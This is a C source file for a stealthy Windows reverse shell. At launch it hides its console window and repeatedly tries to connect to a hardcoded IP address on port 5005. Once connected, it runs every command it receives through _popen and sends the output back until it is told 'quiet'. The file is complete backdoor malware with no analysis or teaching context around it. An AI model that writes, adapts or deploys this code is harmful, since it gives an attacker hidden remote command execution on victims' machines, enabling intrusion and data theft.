#include <stdio.h>
#include <stdlib.h>
#include <strings.h>
#include <unistd.h>
/*#ifdef _WIN32
#include <winuser.h>
#endif */
#include <winsock2.h>
#include <wininet.h>
#include <windows.h>
#include <windowsx.h>
#include <sys/stat.h>
#include <sys/types.h>

#define bzero(p, size) (void) memset((p),0 ,(size))

int sock;


void revShell(){
  char buff[1024];
  char container[1024]; 
  char response_total[18384];
  while(1){
    jump:
    bzero(buff, sizeof(buff));
    bzero(container, sizeof(container));
    bzero(response_total, sizeof(response_total));
    recv(sock, buff , 1024 ,0);
    if(strncmp("quiet", buff, 5) == 0){
      closesocket(sock);
      WSACleanup();
      exit(0);
    }
    else{
      FILE *fp;
      fp = _popen(buff,  "r");
      while(fgets(container,1024, fp) != NULL){
        strcat(response_total, container);  
      }   
      send(sock, response_total, sizeof(response_total), 0);
      fclose(fp);
    }


  }
  
}



int APIENTRY  WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int nCmdShow){
  
  HWND stealth;
  AllocConsole();
  stealth = FindWindowA("ConsoleWindowClass", NULL);
  ShowWindow(stealth, 0);


  struct sockaddr_in socket_server;
  WSADATA wsaData;

  if(WSAStartup(MAKEWORD(2,0), &wsaData) != 0){
    exit(1);
  }

  sock = socket(AF_INET, SOCK_STREAM, 0);

  memset(&socket_server, 0, sizeof(socket_server));
  socket_server.sin_family = AF_INET;
  socket_server.sin_addr.s_addr = inet_addr("192.168.18.208");
  socket_server.sin_port = htons(5005);
  
  start:
  while(connect(sock , (struct sockaddr *) &socket_server, sizeof(socket_server)) != 0)
  {
    Sleep(10);
    goto start;
  }
  revShell();

  return 0;
}
